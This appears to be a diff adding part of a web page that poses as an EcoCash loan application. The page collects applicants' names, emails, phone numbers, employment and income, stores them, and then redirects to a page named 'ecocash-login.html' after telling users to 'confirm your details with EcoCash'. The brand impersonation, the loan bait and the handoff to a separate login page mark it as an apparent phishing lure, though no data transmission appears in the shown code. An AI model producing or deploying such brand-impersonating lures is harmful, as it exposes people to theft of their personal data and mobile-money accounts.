+                                <path d="M19 12H5" />
+                            </svg>
+                            Previous
+                        </button>
+                        <button class="btn btn-primary" id="nextToEmployment">
+                            Next Step
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M5 12h14" />
+                                <path d="m12 5 7 7-7 7" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="footer-note">
+                    <div>Your information is secure and encrypted</div>
+                    <div>Powered by <span class="brand">EcoCash</span></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PAGE 4: Employment Information (Step 3) -->
+        <section id="page-step3" class="page-section">
+            <div class="loan-card">
+                <div class="card-title">
+                    <h2>Loan Application</h2>
+                    <p>Complete the form below to apply for your loan</p>
+                </div>
+
+                <div class="steps-wrap">
+                    <div class="step-bars">
+                        <span class="bar active"></span>
+                        <span class="bar active"></span>
+                        <span class="bar active"></span>
+                        <span class="bar"></span>
+                    </div>
+                    <div class="step-labels">
+                        <span>Loan Details</span>
+                        <span>Personal Info</span>
+                        <span class="active-label">Employment</span>
+                        <span>Review</span>
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <h3>Employment Details</h3>
+
+                    <div class="field">
+                        <label>Employment Status</label>
+                        <select class="select-field" id="employmentStatus">
+                            <option value="">Select status</option>
+                            <option value="Employed">Employed</option>
+                            <option value="Self-Employed">Self-Employed</option>
+                            <option value="Unemployed">Unemployed</option>
+                            <option value="Student">Student</option>
+                        </select>
+                        <div class="field-error" id="employmentStatusError">This field is required</div>
+                    </div>
+
+                    <div class="field">
+                        <label>Annual Income ($)</label>
+                        <input type="number" class="input-field" id="annualIncome" placeholder="50,000" value="50000" />
+                        <div class="field-error" id="annualIncomeError">Please enter your annual income</div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button class="btn btn-secondary" id="backToStep2">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="m12 19-7-7 7-7" />
+                                <path d="M19 12H5" />
+                            </svg>
+                            Previous
+                        </button>
+                        <button class="btn btn-primary" id="nextToReview">
+                            Review Application
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M5 12h14" />
+                                <path d="m12 5 7 7-7 7" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="footer-note">
+                    <div>Your information is secure and encrypted</div>
+                    <div>Powered by <span class="brand">EcoCash</span></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PAGE 5: Review & Submit (Step 4) -->
+        <section id="page-step4" class="page-section">
+            <div class="loan-card">
+                <div class="card-title">
+                    <h2>Review Application</h2>
+                    <p>Please review your details before submitting</p>
+                </div>
+
+                <div class="steps-wrap">
+                    <div class="step-bars">
+                        <span class="bar active"></span>
+                        <span class="bar active"></span>
+                        <span class="bar active"></span>
+                        <span class="bar active"></span>
+                    </div>
+                    <div class="step-labels">
+                        <span>Loan Details</span>
+                        <span>Personal Info</span>
+                        <span>Employment</span>
+                        <span class="active-label">Review</span>
+                    </div>
+                </div>
+
+                <div class="summary-box">
+                    <h4>Application Summary</h4>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="2" x2="12" y2="22"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                            <span>Loan Amount</span>
+                        </span>
+                        <span class="right" id="review-amount">$2,500</span>
+                    </div>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 2v4"/><path d="M16 2v4"/><rect width="18" height="18" x="3" y="4" rx="2"/><path d="M3 10h18"/></svg>
+                            <span>Loan Term</span>
+                        </span>
+                        <span class="right" id="review-term">12 months</span>
+                    </div>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>
+                            <span>Loan Type</span>
+                        </span>
+                        <span class="right" id="review-type">Personal Loan</span>
+                    </div>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>
+                            <span>Purpose</span>
+                        </span>
+                        <span class="right" id="review-purpose">-</span>
+                    </div>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                            <span>Applicant</span>
+                        </span>
+                        <span class="right" id="review-name">-</span>
+                    </div>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                            <span>Email</span>
+                        </span>
+                        <span class="right" id="review-email">-</span>
+                    </div>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.362 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.574 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                            <span>Phone</span>
+                        </span>
+                        <span class="right" id="review-phone">-</span>
+                    </div>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/></svg>
+                            <span>Employment</span>
+                        </span>
+                        <span class="right" id="review-employment">-</span>
+                    </div>
+
+                    <div class="summary-row">
+                        <span class="left">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/></svg>
+                            <span>Annual Income</span>
+                        </span>
+                        <span class="right" id="review-income">-</span>
+                    </div>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn btn-secondary" id="backToStep3">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="m12 19-7-7 7-7" />
+                            <path d="M19 12H5" />
+                        </svg>
+                        Previous
+                    </button>
+                    <button class="btn btn-success" id="submitApplication">
+                        Submit Application
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M20 14.66V20a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h5.34" />
+                            <polygon points="18 2 22 6 12 16 8 16 8 12 18 2" />
+                        </svg>
+                    </button>
+                </div>
+
+                <div class="footer-note">
+                    <div>Your information is secure and encrypted</div>
+                    <div>Powered by <span class="brand">EcoCash</span></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PAGE 6: Success Confirmation -->
+        <section id="page-success" class="page-section">
+            <div class="loan-card" style="text-align: center;">
+                <div class="success-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M20 6L9 17l-5-5" />
+                    </svg>
+                </div>
+
+                <div class="card-title">
+                    <h2 style="color: hsl(var(--primary));">Success! Congratulations 🎉</h2>
+                    <p style="font-size: 1.2rem; font-weight: 600; color: hsl(var(--foreground)); margin-top: 0.5rem;" id="successNameDisplay">DICKSON YEGON</p>
+                </div>
+
+                <div class="success-message">
+                    Your details have been submitted successfully.
+                </div>
+
+                <div class="success-message" style="font-size: 0.85rem; font-weight: 500; color: hsl(var(--eco-blue));">
+                    For the next step, you are required to confirm your details with EcoCash
+                </div>
+
+                <div class="redirect-timer">
+                    Redirecting in <strong id="redirectTimer">5</strong> seconds
+                </div>
+
+                <div class="footer-note" style="margin-top: 2rem;">
+                    <div>Powered by <span class="brand">EcoCash</span></div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // ============================================================
+        // COUNTRY CODE DATA - SIMPLIFIED (no flags)
+        // ============================================================
+        const countryCodes = [
+            '+263', '+27', '+260', '+255', '+254', '+256', '+233', '+234',
+            '+44', '+1', '+91', '+61', '+86', '+81', '+49', '+33', '+39',
+            '+34', '+55', '+52', '+7', '+82', '+31', '+46', '+41', '+64',
+            '+65', '+60', '+63', '+62', '+66', '+971', '+966', '+972',
+            '+353', '+45', '+47', '+358', '+30', '+90', '+20'
+        ];
+
+        // ============================================================
+        // CALCULATOR FUNCTIONS
+        // ============================================================
+        function calculatePayment(amount, termMonths) {
+            const annualRate = 0.10;
+            const monthlyRate = annualRate / 12;
+            const n = termMonths;
+            if (monthlyRate === 0) return amount / n;
+            const payment = amount * (monthlyRate * Math.pow(1 + monthlyRate, n)) / (Math.pow(1 + monthlyRate, n) - 1);
+            return payment;
+        }
+
+        function formatCurrency(value) {
+            return '$' + value.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+        }
+
+        function updateCalculator(amountSlider, termSlider, amountDisplay, termDisplay, paymentDisplay) {
+            const amount = parseInt(amountSlider.value);
+            const term = parseInt(termSlider.value);
+            const payment = calculatePayment(amount, term);
+
+            amountDisplay.textContent = '$' + amount.toLocaleString();
+            termDisplay.textContent = term + ' months';
+            paymentDisplay.textContent = formatCurrency(payment);
+        }
+
+        // ============================================================
+        // PAGE NAVIGATION
+        // ============================================================
+        function showPage(pageId) {
+            document.querySelectorAll('.page-section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // ============================================================
+        // DOM ELEMENTS
+        // ============================================================
+        // Calculator
+        const calcAmount = document.getElementById('calc-amount');
+        const calcTerm = document.getElementById('calc-term');
+        const calcAmountDisplay = document.getElementById('calc-amount-display');
+        const calcTermDisplay = document.getElementById('calc-term-display');
+        const calcPayment = document.getElementById('calc-payment');
+
+        // Step 1 (Loan Details)
+        const step1Amount = document.getElementById('step1-amount');
+        const step1Term = document.getElementById('step1-term');
+        const step1AmountDisplay = document.getElementById('step1-amount-display');
+        const step1TermDisplay = document.getElementById('step1-term-display');
+        const step1Payment = document.getElementById('step1-payment');
+
+        const loanAmountInput = document.getElementById('loanAmountInput');
+        const loanTermSelect = document.getElementById('loanTermSelect');
+        const loanType = document.getElementById('loanType');
+        const loanPurpose = document.getElementById('loanPurpose');
+
+        // Error elements for Step 1
+        const loanTypeError = document.getElementById('loanTypeError');
+        const loanAmountError = document.getElementById('loanAmountError');
+        const loanPurposeError = document.getElementById('loanPurposeError');
+
+        // Step 2 (Personal Info)
+        const firstName = document.getElementById('firstName');
+        const lastName = document.getElementById('lastName');
+        const email = document.getElementById('email');
+        const phone = document.getElementById('phone');
+        const countryCodeSelect = document.getElementById('countryCode');
+
+        // Error elements for Step 2
+        const firstNameError = document.getElementById('firstNameError');
+        const lastNameError = document.getElementById('lastNameError');
+        const emailError = document.getElementById('emailError');
+        const phoneError = document.getElementById('phoneError');
+
+        // Step 3 (Employment)
+        const employmentStatus = document.getElementById('employmentStatus');
+        const annualIncome = document.getElementById('annualIncome');
+
+        // Error elements for Step 3
+        const employmentStatusError = document.getElementById('employmentStatusError');
+        const annualIncomeError = document.getElementById('annualIncomeError');
+
+        // Step 4 (Review)
+        const reviewAmount = document.getElementById('review-amount');
+        const reviewTerm = document.getElementById('review-term');
+        const reviewType = document.getElementById('review-type');
+        const reviewPurpose = document.getElementById('review-purpose');
+        const reviewName = document.getElementById('review-name');
+        const reviewEmail = document.getElementById('review-email');
+        const reviewPhone = document.getElementById('review-phone');
+        const reviewEmployment = document.getElementById('review-employment');
+        const reviewIncome = document.getElementById('review-income');
+
+        // Success Page
+        const successNameDisplay = document.getElementById('successNameDisplay');
+        const redirectTimer = document.getElementById('redirectTimer');
+
+        // ============================================================
+        // INITIALIZE
+        // ============================================================
+        function initCalculator() {
+            updateCalculator(calcAmount, calcTerm, calcAmountDisplay, calcTermDisplay, calcPayment);
+            updateCalculator(step1Amount, step1Term, step1AmountDisplay, step1TermDisplay, step1Payment);
+        }
+
+        // ============================================================
+        // EVENT LISTENERS FOR CALCULATOR
+        // ============================================================
+        calcAmount.addEventListener('input', function() {
+            updateCalculator(calcAmount, calcTerm, calcAmountDisplay, calcTermDisplay, calcPayment);
+        });
+
+        calcTerm.addEventListener('input', function() {
+            updateCalculator(calcAmount, calcTerm, calcAmountDisplay, calcTermDisplay, calcPayment);
+        });
+
+        // ============================================================
+        // EVENT LISTENERS FOR STEP 1 SLIDERS
+        // ============================================================
+        step1Amount.addEventListener('input', function() {
+            const amount = parseInt(step1Amount.value);
+            const term = parseInt(step1Term.value);
+            const payment = calculatePayment(amount, term);
+            step1AmountDisplay.textContent = '$' + amount.toLocaleString();
+            step1TermDisplay.textContent = term + ' months';
+            step1Payment.textContent = formatCurrency(payment);
+            loanAmountInput.value = amount;
+            loanAmountError.classList.remove('visible');
+            loanAmountInput.classList.remove('error');
+        });
+
+        step1Term.addEventListener('input', function() {
+            const amount = parseInt(step1Amount.value);
+            const term = parseInt(step1Term.value);
+            const payment = calculatePayment(amount, term);
+            step1AmountDisplay.textContent = '$' + amount.toLocaleString();
+            step1TermDisplay.textContent = term + ' months';
+            step1Payment.textContent = formatCurrency(payment);
+
+            const options = loanTermSelect.options;
+            for (let i = 0; i < options.length; i++) {
+                if (parseInt(options[i].value) === term) {
+                    loanTermSelect.selectedIndex = i;
+                    break;
+                }
+            }
+        });
+
+        // ============================================================
+        // SYNC LOAN AMOUNT INPUT WITH SLIDER
+        // ============================================================
+        loanAmountInput.addEventListener('input', function() {
+            let val = parseInt(this.value) || 0;
+            val = Math.max(100, Math.min(5000, val));
+            step1Amount.value = val;
+            step1AmountDisplay.textContent = '$' + val.toLocaleString();
+            const term = parseInt(step1Term.value);
+            const payment = calculatePayment(val, term);
+            step1Payment.textContent = formatCurrency(payment);
+            loanAmountError.classList.remove('visible');
+            this.classList.remove('error');
+        });
+
+        // ============================================================
+        // SYNC LOAN TERM SELECT WITH SLIDER
+        // ============================================================
+        loanTermSelect.addEventListener('change', function() {
+            const term = parseInt(this.value);
+            step1Term.value = term;
+            step1TermDisplay.textContent = term + ' months';
+            const amount = parseInt(step1Amount.value);
+            const payment = calculatePayment(amount, term);
+            step1Payment.textContent = formatCurrency(payment);
+        });
+
+        // ============================================================
+        // CLEAR ERRORS ON INPUT
+        // ============================================================
+        loanType.addEventListener('change', function() {
+            loanTypeError.classList.remove('visible');
+            this.classList.remove('error');
+        });
+        loanPurpose.addEventListener('input', function() {
+            loanPurposeError.classList.remove('visible');
+            this.classList.remove('error');
+        });
+
+        firstName.addEventListener('input', function() {
+            firstNameError.classList.remove('visible');
+            this.classList.remove('error');
+        });
+        lastName.addEventListener('input', function() {
+            lastNameError.classList.remove('visible');
+            this.classList.remove('error');
+        });
+        email.addEventListener('input', function() {
+            emailError.classList.remove('visible');
+            this.classList.remove('error');
+        });
+        phone.addEventListener('input', function() {
+            phoneError.classList.remove('visible');
+            document.getElementById('phoneGroup').classList.remove('error');
+        });
+
+        employmentStatus.addEventListener('change', function() {
+            employmentStatusError.classList.remove('visible');
+            this.classList.remove('error');
+        });
+        annualIncome.addEventListener('input', function() {
+            annualIncomeError.classList.remove('visible');
+            this.classList.remove('error');
+        });
+
+        // ============================================================
+        // NAVIGATION: Apply Now button (Calculator -> Step 1)
+        // ============================================================
+        document.getElementById('applyNowBtn').addEventListener('click', function() {
+            syncSliders(calcAmount, calcTerm, step1Amount, step1Term);
+            const amount = parseInt(step1Amount.value);
+            const term = parseInt(step1Term.value);
+            const payment = calculatePayment(amount, term);
+            step1AmountDisplay.textContent = '$' + amount.toLocaleString();
+            step1TermDisplay.textContent = term + ' months';
+            step1Payment.textContent = formatCurrency(payment);
+            loanAmountInput.value = amount;
+
+            const options = loanTermSelect.options;
+            for (let i = 0; i < options.length; i++) {
+                if (parseInt(options[i].value) === term) {
+                    loanTermSelect.selectedIndex = i;
+                    break;
+                }
+            }
+
+            showPage('page-step1');
+        });
+
+        // ============================================================
+        // SYNC SLIDERS
+        // ============================================================
+        function syncSliders(sourceAmount, sourceTerm, targetAmount, targetTerm) {
+            targetAmount.value = sourceAmount.value;
+            targetTerm.value = sourceTerm.value;
+        }
+
+        // ============================================================
+        // NAVIGATION: Back to Calculator (Step 1)
+        // ============================================================
+        document.getElementById('backToCalculator').addEventListener('click', function() {
+            showPage('page-calculator');
+        });
+
+        // ============================================================
+        // NAVIGATION: Next to Personal Info (Step 1 -> Step 2)
+        // ============================================================
+        document.getElementById('nextToPersonal').addEventListener('click', function() {
+            let valid = true;
+
+            if (!loanType.value) {
+                loanTypeError.classList.add('visible');
+                loanType.classList.add('error');
+                valid = false;
+            } else {
+                loanTypeError.classList.remove('visible');
+                loanType.classList.remove('error');
+            }
+
+            const amount = parseInt(loanAmountInput.value);
+            if (!amount || amount < 100 || amount > 5000) {
+                loanAmountError.classList.add('visible');
+                loanAmountInput.classList.add('error');
+                valid = false;
+            } else {
+                loanAmountError.classList.remove('visible');
+                loanAmountInput.classList.remove('error');
+            }
+
+            if (!loanPurpose.value.trim()) {
+                loanPurposeError.classList.add('visible');
+                loanPurpose.classList.add('error');
+                valid = false;
+            } else {
+                loanPurposeError.classList.remove('visible');
+                loanPurpose.classList.remove('error');
+            }
+
+            if (valid) {
+                showPage('page-step2');
+            }
+        });
+
+        // ============================================================
+        // NAVIGATION: Back to Step 1 (Step 2)
+        // ============================================================
+        document.getElementById('backToStep1').addEventListener('click', function() {
+            showPage('page-step1');
+        });
+
+        // ============================================================
+        // NAVIGATION: Next to Employment (Step 2 -> Step 3)
+        // ============================================================
+        document.getElementById('nextToEmployment').addEventListener('click', function() {
+            let valid = true;
+
+            if (!firstName.value.trim()) {
+                firstNameError.classList.add('visible');
+                firstName.classList.add('error');
+                valid = false;
+            } else {
+                firstNameError.classList.remove('visible');
+                firstName.classList.remove('error');
+            }
+
+            if (!lastName.value.trim()) {
+                lastNameError.classList.add('visible');
+                lastName.classList.add('error');
+                valid = false;
+            } else {
+                lastNameError.classList.remove('visible');
+                lastName.classList.remove('error');
+            }
+
+            if (!email.value.trim() || !email.value.includes('@')) {
+                emailError.classList.add('visible');
+                email.classList.add('error');
+                valid = false;
+            } else {
+                emailError.classList.remove('visible');
+                email.classList.remove('error');
+            }
+
+            const phoneValue = phone.value.trim();
+            if (!phoneValue || phoneValue.length < 7) {
+                phoneError.classList.add('visible');
+                document.getElementById('phoneGroup').classList.add('error');
+                valid = false;
+            } else {
+                phoneError.classList.remove('visible');
+                document.getElementById('phoneGroup').classList.remove('error');
+            }
+
+            if (valid) {
+                showPage('page-step3');
+            }
+        });
+
+        // ============================================================
+        // NAVIGATION: Back to Step 2 (Step 3)
+        // ============================================================
+        document.getElementById('backToStep2').addEventListener('click', function() {
+            showPage('page-step2');
+        });
+
+        // ============================================================
+        // NAVIGATION: Next to Review (Step 3 -> Step 4)
+        // ============================================================
+        document.getElementById('nextToReview').addEventListener('click', function() {
+            let valid = true;
+
+            if (!employmentStatus.value) {
+                employmentStatusError.classList.add('visible');
+                employmentStatus.classList.add('error');
+                valid = false;
+            } else {
+                employmentStatusError.classList.remove('visible');
+                employmentStatus.classList.remove('error');
+            }
+
+            const income = parseInt(annualIncome.value);
+            if (!income || income <= 0) {
+                annualIncomeError.classList.add('visible');
+                annualIncome.classList.add('error');
+                valid = false;
+            } else {
+                annualIncomeError.classList.remove('visible');
+                annualIncome.classList.remove('error');
+            }
+
+            if (valid) {
+                const phoneNumber = phone.value.trim();
+                const countryCode = countryCodeSelect.value;
+                const fullPhone = countryCode + phoneNumber;
+                
+                reviewAmount.textContent = '$' + parseInt(loanAmountInput.value).toLocaleString();
+                reviewTerm.textContent = loanTermSelect.value + ' months';
+                reviewType.textContent = loanType.value;
+                reviewPurpose.textContent = loanPurpose.value || '-';
+                reviewName.textContent = firstName.value + ' ' + lastName.value;
+                reviewEmail.textContent = email.value;
+                reviewPhone.textContent = fullPhone;
+                reviewEmployment.textContent = employmentStatus.value;
+                reviewIncome.textContent = '$' + parseInt(annualIncome.value).toLocaleString();
+
+                showPage('page-step4');
+            }
+        });
+
+        // ============================================================
+        // NAVIGATION: Back to Step 3 (Step 4)
+        // ============================================================
+        document.getElementById('backToStep3').addEventListener('click', function() {
+            showPage('page-step3');
+        });
+
+        // ============================================================
+        // SUBMIT APPLICATION (Step 4 -> Success Page)
+        // ============================================================
+        document.getElementById('submitApplication').addEventListener('click', function() {
+            const phoneNumber = phone.value.trim();
+            const countryCode = countryCodeSelect.value;
+            const fullPhone = countryCode + phoneNumber;
+            
+            // Save all form data to localStorage
+            const formData = {
+                firstName: firstName.value,
+                lastName: lastName.value,
+                email: email.value,
+                phone: phoneNumber,
+                countryCode: countryCode,
+                fullPhone: fullPhone,
+                loanType: loanType.value,
+                loanAmount: loanAmountInput.value,
+                loanTerm: loanTermSelect.value,
+                loanPurpose: loanPurpose.value,
+                employmentStatus: employmentStatus.value,
+                annualIncome: annualIncome.value
+            };
+            
+            try {
+                localStorage.setItem('ecocash_application', JSON.stringify(formData));
+                console.log('Application data saved to localStorage:', formData);
+                console.log('Country Code:', countryCode);
+                console.log('Full Phone:', fullPhone);
+            } catch (e) {
+                console.error('Error saving to localStorage:', e);
+            }
+
+            const fullName = (firstName.value + ' ' + lastName.value).toUpperCase().trim() || 'DICKSON YEGON';
+            successNameDisplay.textContent = fullName;
+            showPage('page-success');
+
+            let seconds = 5;
+            redirectTimer.textContent = seconds;
+            const countdown = setInterval(function() {
+                seconds--;
+                redirectTimer.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    window.location.href = 'ecocash-login.html';
+                }
+            }, 1000);
+        });
+
+        // ============================================================
+        // INITIALIZE ON LOAD
+        // ============================================================
+        initCalculator();
+        
+        console.log('✅ Code 1 initialized with country codes (no flags)');
+        console.log('📱 Available country codes:', countryCodes.length);
+    </script>
+
+</body>
+</html>
